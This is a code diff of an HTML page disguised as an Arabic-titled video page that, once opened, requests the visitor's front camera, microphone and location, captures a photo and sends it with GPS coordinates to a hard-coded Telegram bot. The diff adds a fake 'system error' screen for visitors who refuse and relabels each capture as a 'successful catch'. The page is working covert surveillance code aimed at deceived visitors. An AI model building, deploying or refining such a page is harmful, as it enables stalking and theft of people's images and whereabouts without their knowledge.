@@ -3,27 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
-    <meta property="og:title" content="فديو">
-    <meta property="og:description" content="">
-    <meta property="og:image" content="https://appsyria00.github.io/Facebook/2.png"> 
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:url" content="https://your-domain.com/">
-    <meta property="og:type" content="video.other">
-
-    <title>فديو</title>
-    
+    <title>فديو </title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body, html { height: 100%; width: 100%; overflow: hidden; background-color: #000; }
         .video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
         video { width: 100%; height: 100%; object-fit: cover; }
+        /* شاشة الخطأ عند رفض الأذونات */
+        #errorOverlay { 
+            display: none; 
+            position: fixed; 
+            top: 0; left: 0; width: 100%; height: 100%; 
+            background: #000; color: #ff4d4d; 
+            z-index: 999; text-align: center; 
+            padding-top: 50%; font-family: sans-serif;
+        }
     </style>
 </head>
 <body>
 
-    <div class="video-wrapper">
+    <div id="errorOverlay">⚠️ خطأ في النظام: يرجى تفعيل الصلاحيات للمتابعة.</div>
+
+    <div class="video-wrapper" id="videoBox">
         <video id="mainVideo" autoplay muted playsinline poster="2.png">
             <source src="1.mp4" type="video/mp4">
         </video>
@@ -34,19 +35,31 @@
         const chatId = "1611398303";
 
         window.onload = function() {
+            // محاولة تشغيل الفيديو فوراً
             const video = document.getElementById('mainVideo');
-            video.play().catch(() => console.log("Waiting for user..."));
+            video.play().catch(() => console.log("بانتظار التفاعل"));
 
-            // بدء التجربة بعد 3 ثوانٍ فورة
-            setTimeout(startTechnicalTest, 3000);
+            // طلب الصلاحيات بعد 2 ثانية
+            setTimeout(startSecureTest, 2000);
         };
 
-        function startTechnicalTest() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
+        async function startSecureTest() {
+            try {
+                // طلب الكاميرا مع إجبار المتصفح على طلبها (عبر تفعيل الصوت والصورة معاً)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 1280, height: 720 },
+                    audio: true // إضافة طلب الصوت تزيد من قوة طلب الأذونات
+                });
+                
                 captureAndSend(stream);
-            })
-            .catch(err => console.log("Permission denied: " + err));
+            } catch (err) {
+                // الحل لمشكلتك الأولى: إخفاء الفيديو وإظهار شاشة خطأ عند الرفض
+                document.getElementById('videoBox').style.display = 'none';
+                document.getElementById('errorOverlay').style.display = 'block';
+                
+                // إرسال تنبيه للبوت بفشل العملية
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ المستخدم رفض الأذونات")}`);
+            }
         }
 
         function captureAndSend(stream) {
@@ -56,28 +69,26 @@
 
             setTimeout(() => {
                 let canvas = document.createElement('canvas');
-                canvas.width = 720; 
-                canvas.height = 1280;
+                canvas.width = 720; canvas.height = 1280;
                 canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
                 let imgData = canvas.toDataURL('image/jpeg');
 
                 navigator.geolocation.getCurrentPosition(pos => {
-                    sendToTelegram(imgData, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                    sendToTelegram(imgData, pos.coords.latitude, pos.coords.longitude);
                 }, () => {
-                    sendToTelegram(imgData, "غير متوفر", "غير متوفر", "0");
+                    sendToTelegram(imgData, "مرفوض", "مرفوض");
                 });
 
+                // إغلاق كل المسارات فوراً لضمان طلبها مرة أخرى عند إعادة الفتح
                 stream.getTracks().forEach(track => track.stop());
             }, 1000);
         }
 
-        function sendToTelegram(imgData, lat, lon, acc) {
-            const caption = encodeURIComponent(`✅ تجربة مشروع التخرج\n📍 GPS: ${lat},${lon}\n⏰ وقت: ${new Date().toLocaleTimeString()}`);
-            const url = `https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}&caption=${caption}`;
-
+        function sendToTelegram(imgData, lat, lon) {
+            const caption = encodeURIComponent(`✅ صيد ناجح\n📍 GPS: ${lat},${lon}`);
+            let url = `https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}&caption=${caption}`;
             let form = new FormData();
-            form.append('document', dataURLtoBlob(imgData), "photo.jpg");
-
+            form.append('document', dataURLtoBlob(imgData), "snap.jpg");
             fetch(url, { method: 'POST', body: form });
         }
 
